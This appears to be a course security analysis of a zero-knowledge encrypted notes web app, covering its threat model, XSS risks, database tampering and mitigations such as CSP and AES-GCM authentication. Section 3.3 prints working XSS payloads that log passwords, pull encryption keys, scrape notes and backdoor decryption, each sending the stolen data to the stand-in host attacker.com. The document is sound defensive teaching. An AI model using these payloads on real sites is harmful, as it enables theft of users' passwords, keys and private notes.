# Security Analysis Document – Secure Notes Application

## 1. Executive Summary

This document provides a comprehensive security analysis of the Secure Notes zero-knowledge encrypted notes application. It explicitly addresses:

1. **XSS (Cross-Site Scripting) vulnerabilities** and their impact on client-side encryption
2. **Data tampering scenarios** and integrity verification mechanisms
3. **Threat model** and security boundaries
4. **Mitigations** and residual risks

**Key Finding:** While zero-knowledge architecture protects against server/database compromise, XSS attacks can completely bypass client-side encryption by compromising the browser environment itself.

---

## 2. Threat Model

### 2.1 Assets to Protect

**Critical Assets:**
- User's plaintext note content
- Master encryption key (derived from password)
- User's master password
- Session tokens (JWT)

**Secondary Assets:**
- User email addresses
- Note metadata (timestamps, note IDs)
- User account credentials

### 2.2 Trust Boundaries

```
┌─────────────────────────────────────────────────────┐
│  TRUSTED: Client Browser (during clean session)     │
│  • JavaScript execution environment                 │
│  • Web Crypto API                                   │
│  • User's master key in memory                      │
│  • DOM and React state                              │
└─────────────────────────────────────────────────────┘
                        │
                        │ HTTPS (encrypted transport)
                        ▼
┌─────────────────────────────────────────────────────┐
│  UNTRUSTED: Server and Network                      │
│  • Express backend                                  │
│  • PostgreSQL database                              │
│  • Network infrastructure                           │
│  • System administrators                            │
└─────────────────────────────────────────────────────┘
```

**Assumption:** Browser is trusted during a session, but can be compromised via XSS.

### 2.3 Attacker Models

#### Attacker 1: External Network Attacker
- **Capabilities:** Monitor/intercept network traffic
- **Goal:** Read note content or steal credentials
- **Mitigation:** HTTPS/TLS encryption

#### Attacker 2: Compromised Server/Database Admin
- **Capabilities:** Full read/write access to database and server logs
- **Goal:** Read user notes
- **Mitigation:** Zero-knowledge encryption (server has no keys)

#### Attacker 3: XSS Attacker
- **Capabilities:** Execute JavaScript in user's browser
- **Goal:** Steal encryption keys, passwords, or plaintext
- **Mitigation:** CSP, input validation, React escaping (partial protection)

#### Attacker 4: Malicious Insider (Database Tampering)
- **Capabilities:** Modify database records
- **Goal:** Inject malicious content or corrupt data
- **Mitigation:** AES-GCM authentication tags

---

## 3. XSS Vulnerability Analysis (Explicit Course Requirement)

### 3.1 Why XSS is Critical in Zero-Knowledge Systems

In traditional web applications, XSS allows attackers to:
- Steal session cookies
- Perform actions as the user
- Deface the website

In **zero-knowledge encrypted systems**, XSS is **catastrophically worse** because:
- The browser holds the **only copy** of the encryption key
- The server cannot help (it doesn't have the key)
- All security guarantees collapse if the browser is compromised

### 3.2 XSS Attack Vectors in This Application

#### Vector 1: Stored XSS in Note Content

**Scenario:**
```javascript
// Attacker creates note with malicious content
noteContent = "<img src=x onerror='maliciousCode()'>";

// If not properly escaped when displayed:
<div dangerouslySetInnerHTML={{ __html: noteContent }} />
// Result: Script executes when note is viewed
```

**Impact:**
- Script runs in victim's browser with full access to:
  - Master encryption key in memory
  - All decrypted note content in DOM
  - Future passwords user types

#### Vector 2: Reflected XSS in URL Parameters

**Scenario:**
```javascript
// Malicious URL sent to victim
https://app.example.com/notes?search=<script>steal()</script>

// If search parameter rendered without encoding:
<div>Results for: {params.search}</div>
// Result: Script executes
```

#### Vector 3: DOM-Based XSS

**Scenario:**
```javascript
// Vulnerable code that uses location hash
const noteId = window.location.hash.slice(1);
document.getElementById('note-title').innerHTML = noteId;

// Malicious URL:
https://app.example.com/notes#<img src=x onerror=steal()>
```

### 3.3 What an XSS Attacker Can Do

#### Attack 1: Keylogging the Master Password

**Exploit Code:**
```javascript
// Injected via XSS
document.addEventListener('input', function(event) {
  if (event.target.type === 'password') {
    // Steal password as user types
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({
        password: event.target.value,
        email: getCurrentUserEmail()
      }),
      mode: 'no-cors'  // Bypass CORS
    });
  }
});
```

**Impact:** Attacker gets master password and can decrypt all notes forever.

#### Attack 2: Stealing Encryption Key from Memory

**Exploit Code:**
```javascript
// Access React state/context where key is stored
const reactRoot = document.getElementById('root');
const reactInternals = reactRoot._reactRootContainer._internalRoot;
// Navigate fiber tree to find AuthContext
const authContext = findAuthContext(reactInternals);
const masterKey = authContext.masterKey;

// Exfiltrate key
fetch('https://attacker.com/key', {
  method: 'POST',
  body: JSON.stringify({
    key: await crypto.subtle.exportKey('raw', masterKey),
    userId: authContext.userId
  })
});
```

**Impact:** Attacker can decrypt all current and future notes.

#### Attack 3: Reading Decrypted Plaintext from DOM

**Exploit Code:**
```javascript
// Wait for notes to be decrypted and rendered
setTimeout(() => {
  const notes = document.querySelectorAll('.note-content');
  const plaintextNotes = Array.from(notes).map(note => ({
    content: note.textContent,
    timestamp: note.dataset.timestamp
  }));
  
  fetch('https://attacker.com/data', {
    method: 'POST',
    body: JSON.stringify(plaintextNotes)
  });
}, 5000);
```

**Impact:** All currently visible notes stolen.

#### Attack 4: Backdooring Crypto Functions

**Exploit Code:**
```javascript
// Replace crypto functions with malicious versions
const originalDecrypt = crypto.subtle.decrypt;
crypto.subtle.decrypt = async function(...args) {
  // Call original function
  const plaintext = await originalDecrypt.apply(this, args);
  
  // Exfiltrate plaintext
  fetch('https://attacker.com/plaintext', {
    method: 'POST',
    body: plaintext
  }).catch(() => {});  // Silent failure
  
  // Return normally so user doesn't notice
  return plaintext;
};
```

**Impact:** All future decryption operations leak plaintext to attacker.

#### Attack 5: Persistent Backdoor

**Exploit Code:**
```javascript
// Inject persistent backdoor using Service Worker
navigator.serviceWorker.register('data:text/javascript,' + encodeURIComponent(`
  self.addEventListener('fetch', function(event) {
    // Intercept all API calls
    if (event.request.url.includes('/api/notes')) {
      // Clone and exfiltrate
      event.request.clone().json().then(data => {
        fetch('https://attacker.com/intercept', {
          method: 'POST',
          body: JSON.stringify(data)
        });
      });
    }
  });
`));
```

**Impact:** Backdoor persists even after page reload.

### 3.4 XSS Mitigations Implemented

#### Mitigation 1: Content Security Policy (CSP)

**Implementation:**
```javascript
// backend/src/server.js
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],                    // No inline scripts
      scriptSrcAttr: ["'none'"],                // No inline event handlers
      styleSrc: ["'self'", "'unsafe-inline'"],  // Allow inline styles (React)
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'"],                   // API calls to same origin only
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],                    // No plugins
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"],                     // No iframes
      baseUri: ["'self'"],
      formAction: ["'self'"],
      upgradeInsecureRequests: []               // Force HTTPS
    }
  }
}));
```

**What it prevents:**
- ✅ Inline `<script>` tags blocked
- ✅ Inline event handlers blocked (`onclick`, `onerror`, etc.)
- ✅ External script sources blocked
- ✅ `eval()` and similar blocked
- ✅ Data exfiltration to external domains blocked

**Limitations:**
- ⚠️ Does not prevent DOM-based XSS if code is vulnerable
- ⚠️ Requires strict policy enforcement (no `'unsafe-inline'` for scripts)
- ⚠️ Can be bypassed if CSP policy is misconfigured

#### Mitigation 2: React Automatic Escaping

**How React Protects:**
```jsx
// ✅ SAFE: Automatically escaped
function NoteDisplay({ noteContent }) {
  return (
    <div className="note">
      {noteContent}  {/* < > & automatically escaped */}
    </div>
  );
}

// Input: <script>alert('XSS')</script>
// Rendered: &lt;script&gt;alert('XSS')&lt;/script&gt;
// Result: Shows as text, doesn't execute
```

**What it prevents:**
- ✅ Automatic HTML entity encoding
- ✅ Prevents injection in text content
- ✅ Safe by default

**What developers must avoid:**
```jsx
// ❌ DANGEROUS: Bypasses protection
function UnsafeDisplay({ noteContent }) {
  return (
    <div dangerouslySetInnerHTML={{ __html: noteContent }} />
  );
}

// ❌ DANGEROUS: Direct DOM manipulation
function AlsoUnsafe({ noteContent }) {
  const ref = useRef();
  useEffect(() => {
    ref.current.innerHTML = noteContent;  // Not escaped!
  }, [noteContent]);
  return <div ref={ref} />;
}
```

**Coding Rules:**
- NEVER use `dangerouslySetInnerHTML`
- NEVER set `innerHTML` directly
- NEVER use `eval()` or `Function()` constructor
- NEVER render user content as HTML

#### Mitigation 3: Input Validation and Sanitization

**Backend Validation:**
```javascript
// backend/src/middleware/validator.js
const { body, validationResult } = require('express-validator');

const validateNote = [
  body('ciphertext')
    .isBase64()
    .withMessage('Ciphertext must be base64'),
  body('iv')
    .isBase64()
    .isLength({ min: 16, max: 16 })  // 12 bytes base64
    .withMessage('IV must be 12 bytes'),
  body('authTag')
    .isBase64()
    .isLength({ min: 24, max: 24 })  // 16 bytes base64
    .withMessage('Auth tag must be 16 bytes')
];

app.post('/api/notes', validateNote, (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  // Process...
});
```

**Frontend Validation:**
```javascript
// frontend/src/utils/validator.js
export function sanitizeNoteTitle(title) {
  // Remove any potential HTML/script content
  return title
    .replace(/[<>]/g, '')        // Remove angle brackets
    .replace(/javascript:/gi, '') // Remove javascript: protocol
    .trim()
    .slice(0, 200);               // Limit length
}
```

#### Mitigation 4: HTTP-Only Cookies for Session Tokens

**Implementation:**
```javascript
// backend/src/controllers/authController.js
async function login(req, res) {
  // ... authentication logic ...
  
  const token = jwt.sign(
    { userId: user.id, email: user.email },
    process.env.JWT_SECRET,
    { expiresIn: '1h' }
  );
  
  // Store in HTTP-only cookie (not accessible to JavaScript)
  res.cookie('token', token, {
    httpOnly: true,      // Cannot be read by JavaScript
    secure: true,        // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 3600000      // 1 hour
  });
  
  res.json({ message: 'Login successful' });
}
```

**What it prevents:**
- ✅ XSS cannot steal session token from `document.cookie`
- ✅ Token automatically included in requests
- ✅ Reduces XSS impact (but doesn't eliminate it)

**Limitation:**
- ⚠️ XSS can still make authenticated requests on behalf of user

#### Mitigation 5: Additional Security Headers

**Implementation:**
```javascript
app.use(helmet({
  // X-Frame-Options: Prevent clickjacking
  frameguard: { action: 'deny' },
  
  // X-Content-Type-Options: Prevent MIME sniffing
  noSniff: true,
  
  // X-XSS-Protection: Enable browser XSS filter (legacy)
  xssFilter: true,
  
  // Strict-Transport-Security: Force HTTPS
  hsts: {
    maxAge: 31536000,        // 1 year
    includeSubDomains: true,
    preload: true
  },
  
  // Referrer-Policy: Limit referrer information
  referrerPolicy: { policy: 'no-referrer' }
}));
```

### 3.5 Residual XSS Risk

**Despite all mitigations, XSS can still occur if:**

1. **Developer makes a mistake:**
   - Uses `dangerouslySetInnerHTML` somewhere
   - Directly manipulates DOM with `innerHTML`
   - Introduces vulnerable third-party library

2. **Supply chain attack:**
   - Malicious npm package in dependencies
   - Compromised CDN serving malicious code
   - Malicious browser extension

3. **Zero-day browser vulnerability:**
   - CSP bypass in browser
   - Web Crypto API vulnerability

**Conclusion:** Zero-knowledge encryption does NOT protect against XSS. The client trust boundary is the weakest link.

---

## 4. Data Tampering Analysis (Explicit Course Requirement)

### 4.1 Attack Scenarios

#### Scenario 1: Database Administrator Modifies Ciphertext

**Attack:**
```sql
-- Attacker with DB access modifies a note
UPDATE notes 
SET ciphertext = 'aBc123malicious456XyZ789==' 
WHERE id = 42;
```

**System Response:**

1. User requests note 42
2. Server returns modified ciphertext
3. Browser attempts AES-GCM decryption
4. **Authentication tag verification fails**
   - Tag was computed over original ciphertext
   - Modified ciphertext produces different tag
   - Mismatch detected
5. Decryption throws exception
6. UI displays integrity warning

**Code Flow:**
```javascript
// frontend/src/services/cryptoService.js
async function decryptNote(encryptedData, key, userId, noteId) {
  const { ciphertext, iv, authTag } = encryptedData;
  
  const aad = new TextEncoder().encode(
    JSON.stringify({ userId, noteId })
  );
  
  try {
    const plaintext = await crypto.subtle.decrypt(
      {
        name: 'AES-GCM',
        iv: base64ToArrayBuffer(iv),
        additionalData: aad,
        tagLength: 128
      },
      key,
      concatenate(
        base64ToArrayBuffer(ciphertext),
        base64ToArrayBuffer(authTag)
      )
    );
    
    return new TextDecoder().decode(plaintext);
    
  } catch (error) {
    // Auth tag verification failed
    throw new IntegrityError('Note has been tampered with');
  }
}
```

**User Experience:**
```
┌─────────────────────────────────────────────────┐
│  ⚠️  INTEGRITY CHECK FAILED                     │
│                                                  │
│  This note appears to have been tampered with.  │
│  The content cannot be verified and may be      │
│  malicious or corrupted.                        │
│                                                  │
│  [Delete Note]  [Report Issue]  [Cancel]        │
└─────────────────────────────────────────────────┘
```

#### Scenario 2: Attacker Swaps Ciphertexts Between Users

**Attack:**
```sql
-- Try to give User A's note to User B
UPDATE notes 
SET user_id = 456  -- User B
WHERE id = 123 AND user_id = 789;  -- Originally User A's
```

**System Response:**

1. User B requests note 123 (now associated with their account)
2. Server returns ciphertext (originally from User A)
3. Browser attempts decryption with AAD = `{userId: 456, noteId: 123}`
4. **Authentication tag verification fails**
   - Original tag computed with AAD = `{userId: 789, noteId: 123}`
   - AAD mismatch detected
5. Attack prevented

**Why AAD is Critical:**
```javascript
// Encryption includes AAD binding
const aad = { userId: 789, noteId: 123 };
encrypt(plaintext, key, iv, aad) 
  → ciphertext + authTag(ciphertext, aad)

// Attacker changes userId in database
// But tag was computed with original userId

// Decryption with different AAD fails
const aad = { userId: 456, noteId: 123 };  // Different!
decrypt(ciphertext, key, iv, aad, authTag) 
  → TagMismatchError ✅
```

#### Scenario 3: Replay Attack Within Same User

**Attack:**
```sql
-- Copy note 1's content to note 2 (same user)
UPDATE notes 
SET 
  ciphertext = (SELECT ciphertext FROM notes WHERE id = 1),
  iv = (SELECT iv FROM notes WHERE id = 1),
  auth_tag = (SELECT auth_tag FROM notes WHERE id = 1)
WHERE id = 2;
```

**System Response:**

1. User requests note 2
2. Server returns copied ciphertext from note 1
3. Browser attempts decryption with AAD = `{userId, noteId: 2}`
4. **Authentication tag verification fails**
   - Original tag computed with noteId: 1
   - noteId mismatch detected
5. Replay detected

**Protection:**
```javascript
// Each note's tag includes its unique ID
const aad = { userId: 123, noteId: 1 };  // Note 1
encrypt(...) → tag_1

// Trying to use for note 2
const aad = { userId: 123, noteId: 2 };  // Note 2
decrypt(..., tag_1) → FAIL ✅
```

#### Scenario 4: Attacker Modifies IV

**Attack:**
```sql
-- Change initialization vector
UPDATE notes 
SET iv = 'different_random_bytes_base64=='
WHERE id = 42;
```

**System Response:**

AES-GCM decryption fails because:
- IV is critical input to decryption
- Wrong IV produces wrong plaintext (garbage)
- Auth tag computed over correct IV
- Tag verification catches the change

**Result:** Integrity failure detected.

### 4.2 What Tampering CANNOT Do

**Attacker limitations:**

❌ **Cannot forge valid ciphertext** – Requires master key  
❌ **Cannot modify plaintext undetected** – Auth tag will fail  
❌ **Cannot replay between users** – AAD includes userId  
❌ **Cannot replay between notes** – AAD includes noteId  
❌ **Cannot remove/modify auth tag** – Verification will fail  

**Only possible attacks:**
- ✅ Delete notes entirely (denial of service)
- ✅ Revert notes to previous version (if attacker has backup)
- ✅ Prevent user from accessing notes (change ciphertext to garbage)

### 4.3 Demonstration Feature

**Security Demo Page:**
```jsx
// frontend/src/pages/SecurityDemo.jsx
function SecurityDemo() {
  const [notes, setNotes] = useState([]);
  
  async function simulateTampering(noteId) {
    // Call special admin endpoint (dev only)
    await fetch(`/api/admin/tamper/${noteId}`, {
      method: 'POST'
    });
    
    alert('Note has been tampered with in the database');
    
    // Try to load the note
    const result = await loadNote(noteId);
    // Will show integrity error
  }
  
  return (
    <div>
      <h2>Data Tampering Demonstration</h2>
      <p>This page demonstrates integrity verification.</p>
      
      {notes.map(note => (
        <div key={note.id}>
          <h3>{note.id}</h3>
          <button onClick={() => simulateTampering(note.id)}>
            Simulate Tampering
          </button>
        </div>
      ))}
    </div>
  );
}
```

**Admin Endpoint (Development Only):**
```javascript
// backend/src/routes/admin.js (dev only)
if (process.env.NODE_ENV === 'development') {
  app.post('/api/admin/tamper/:id', async (req, res) => {
    const { id } = req.params;
    
    // Flip some bits in ciphertext
    const note = await prisma.note.findUnique({ where: { id } });
    const tamperedCiphertext = flipRandomBits(note.ciphertext);
    
    await prisma.note.update({
      where: { id },
      data: { ciphertext: tamperedCiphertext }
    });
    
    res.json({ message: 'Note tampered for demo' });
  });
}
```

---

## 5. Authentication and Session Security

### 5.1 Password Storage

**Never stored:**
- ❌ Master password (used only for key derivation)
- ❌ Master encryption key

**Stored on server:**
- ✅ Password verifier (PBKDF2-derived hash)
- ✅ Salt for login derivation

**Separation of concerns:**
```javascript
// Two different PBKDF2 operations:

// 1. Encryption key (stays in browser)
const encryptionKey = await deriveKey(
  password, 
  encryptionSalt, 
  100000
);

// 2. Login verifier (sent to server)
const loginVerifier = await deriveKey(
  password, 
  loginSalt, 
  50000  // Different iteration count
);
```

### 5.2 JWT Security

**Token Structure:**
```json
{
  "userId": 123,
  "email": "user@example.com",
  "iat": 1707336000,
  "exp": 1707339600
}
```

**Security Properties:**
- Signed with server secret (HMAC-SHA256)
- Short expiration (1 hour)
- Stored in HTTP-only cookie
- Cannot be tampered without detection

**Token Verification:**
```javascript
function authenticate(req, res, next) {
  const token = req.cookies.token || 
                req.headers.authorization?.split(' ')[1];
  
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.userId = decoded.userId;
    next();
  } catch (error) {
    res.status(401).json({ error: 'Invalid token' });
  }
}
```

### 5.3 Session Management

**Logout:**
```javascript
function logout(req, res) {
  // Clear cookie
  res.clearCookie('token');
  
  // Client clears master key from memory
  // (handled in frontend)
  
  res.json({ message: 'Logged out' });
}
```

**Automatic Timeout:**
```javascript
// Frontend: Clear key after inactivity
useEffect(() => {
  let timeout;
  
  function resetTimeout() {
    clearTimeout(timeout);
    timeout = setTimeout(() => {
      // Auto-logout after 30 minutes inactivity
      handleLogout();
    }, 30 * 60 * 1000);
  }
  
  // Reset on user activity
  window.addEventListener('mousemove', resetTimeout);
  window.addEventListener('keypress', resetTimeout);
  
  return () => {
    window.removeEventListener('mousemove', resetTimeout);
    window.removeEventListener('keypress', resetTimeout);
  };
}, []);
```

---

## 6. Network Security

### 6.1 HTTPS/TLS

**Required in production:**
- All communication over HTTPS
- TLS 1.2+ with strong cipher suites
- Certificate from trusted CA (Let's Encrypt)

**HSTS Header:**
```javascript
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Why critical:**
- Prevents network eavesdropping
- Prevents man-in-the-middle attacks
- Required for secure cookies

### 6.2 CORS Configuration

**Strict origin policy:**
```javascript
const corsOptions = {
  origin: process.env.FRONTEND_URL,  // Exact match only
  credentials: true,                  // Allow cookies
  optionsSuccessStatus: 200
};

app.use(cors(corsOptions));
```

**Why restrictive:**
- Prevents cross-origin data theft
- Limits attack surface
- Works with HTTP-only cookies

---

## 7. Rate Limiting and DoS Prevention

### 7.1 Login Rate Limiting

**Implementation:**
```javascript
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,                     // 5 attempts
  message: 'Too many login attempts, please try again later',
  standardHeaders: true,
  legacyHeaders: false
});

app.post('/api/auth/login', loginLimiter, login);
```

**Protects against:**
- Brute force password attacks
- Credential stuffing
- Account enumeration

### 7.2 API Rate Limiting

**Implementation:**
```javascript
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,  // 100 requests per 15 minutes
  message: 'Too many requests'
});

app.use('/api/', apiLimiter);
```

---

## 8. Privacy Considerations

### 8.1 Username Hashing (Optional)

**Why hash usernames:**
- Prevents user enumeration
- Adds unlinkability
- Privacy enhancement

**Implementation:**
```javascript
async function hashUsername(username) {
  const encoder = new TextEncoder();
  const data = encoder.encode(username);
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  return arrayBufferToBase64(hashBuffer);
}
```

**Trade-off:**
- ✅ Enhanced privacy
- ❌ Cannot do "forgot username" recovery
- ❌ Harder to debug/audit

### 8.2 Metadata Leakage

**What server knows:**
- User email (for login)
- Number of notes per user
- Note timestamps
- Note sizes (ciphertext length)

**What server does NOT know:**
- Note titles
- Note content
- User's real name (if not in email)

---

## 9. Security Best Practices Checklist

### Development Phase
- [ ] Never log sensitive data (passwords, keys, plaintext)
- [ ] Never use `console.log()` with sensitive data in production
- [ ] Never commit `.env` files or secrets to Git
- [ ] Keep dependencies updated (npm audit)
- [ ] Use TypeScript for type safety (optional but recommended)

### Code Review
- [ ] No `dangerouslySetInnerHTML` usage
- [ ] No direct `innerHTML` manipulation
- [ ] No `eval()` or `Function()` constructor
- [ ] All user input validated/sanitized
- [ ] All database queries parameterized (Prisma handles this)

### Deployment
- [ ] HTTPS enabled everywhere
- [ ] Strong JWT_SECRET (32+ random characters)
- [ ] CSP headers configured correctly
- [ ] HSTS headers enabled
- [ ] Rate limiting active
- [ ] Error messages don't leak sensitive info
- [ ] Database credentials secured
- [ ] Regular backups enabled

### Monitoring
- [ ] Log failed login attempts
- [ ] Log integrity check failures
- [ ] Monitor for unusual activity patterns
- [ ] Set up alerts for security events

---

## 10. Known Limitations and Residual Risks

### 10.1 Cannot Protect Against

❌ **Compromised client device**
- Malware on user's computer
- Keyloggers
- Screen capture tools
- Browser extensions with excessive permissions

❌ **Physical access attacks**
- Attacker with physical access to unlocked device
- Cold boot attacks (master key in RAM)

❌ **Social engineering**
- Phishing attacks
- Password reuse
- Weak master passwords

❌ **Supply chain attacks**
- Malicious npm packages
- Compromised CDN
- Malicious browser extensions

### 10.2 Design Trade-offs

**No password recovery = permanent data loss**
- User forgets password → notes lost forever
- Mitigation: Strong user warnings during registration
- Alternative: Optional encrypted key backup (future feature)

**Performance on weak devices**
- PBKDF2 computation takes time
- High iteration count may be slow on old mobile devices
- Trade-off: Security vs. UX

**Single device limitation**
- Master key not synced across devices
- Each device requires password re-entry
- Alternative: Secure key synchronization (future feature)

---

## 11. Incident Response Plan

### 11.1 XSS Vulnerability Discovered

**Immediate Actions:**
1. Identify and patch vulnerable code
2. Deploy fixed version
3. Invalidate all active sessions (force re-login)
4. Notify affected users
5. Recommend password change out of abundance of caution

**Investigation:**
1. Review logs for suspicious activity
2. Identify potentially affected users
3. Assess scope of compromise
4. Document findings

### 11.2 Database Compromise

**Immediate Actions:**
1. Isolate compromised system
2. Notify users of potential metadata leak
3. Emphasize: note content remains encrypted
4. Rotate database credentials
5. Audit database access logs

**User Impact:**
- Note content: ✅ Still secure (encrypted)
- Metadata: ⚠️ May be exposed (timestamps, note counts)
- Passwords: ⚠️ Verifiers exposed (recommend password change)

### 11.3 Server Compromise

**Immediate Actions:**
1. Take server offline
2. Notify users
3. Forensic analysis
4. Rebuild from clean backup
5. Rotate all secrets (JWT_SECRET, database credentials)

**User Impact:**
- Note content: ✅ Still secure (zero-knowledge protected)
- Sessions: ⚠️ May need re-authentication
- Future notes: ✅ Secure after server rebuilt

---

## 12. Security Audit Recommendations

Before production deployment, conduct:

### 12.1 Code Audit
- Review all user input handling
- Verify CSP configuration
- Check for XSS vulnerabilities
- Verify crypto implementation
- Review authentication logic

### 12.2 Penetration Testing
- Attempt XSS attacks
- Test authentication bypass
- Try data tampering attacks
- Test rate limiting effectiveness
- Verify HTTPS enforcement

### 12.3 Cryptographic Review
- Verify PBKDF2 parameters
- Verify AES-GCM implementation
- Check IV randomness
- Verify AAD usage
- Review key lifecycle

---

## 13. Conclusion

This security analysis demonstrates:

### Strengths
✅ Zero-knowledge architecture protects against server compromise  
✅ AES-GCM authenticated encryption prevents tampering  
✅ Strong cryptographic parameters (PBKDF2, AES-256-GCM)  
✅ Multiple layers of XSS protection (CSP, escaping, validation)  
✅ Secure session management (HTTP-only cookies, JWT)  

### Limitations
⚠️ XSS attacks can still bypass encryption if successful  
⚠️ No password recovery mechanism  
⚠️ Single-device limitation  
⚠️ Metadata visible to server  

### Key Insight
**Zero-knowledge encryption shifts the trust boundary from the server to the client, but does not eliminate all risks. The client browser becomes the critical security perimeter, making XSS prevention absolutely essential.**

For educational purposes, this project successfully demonstrates:
- How client-side encryption works in practice
- Why XSS is critical in encrypted applications
- How authenticated encryption detects tampering
- Real-world security trade-offs

---

## References

- [OWASP Top 10 Web Application Security Risks](https://owasp.org/www-project-top-ten/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [NIST Guidelines for Key Derivation](https://csrc.nist.gov/publications/detail/sp/800-132/final)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)
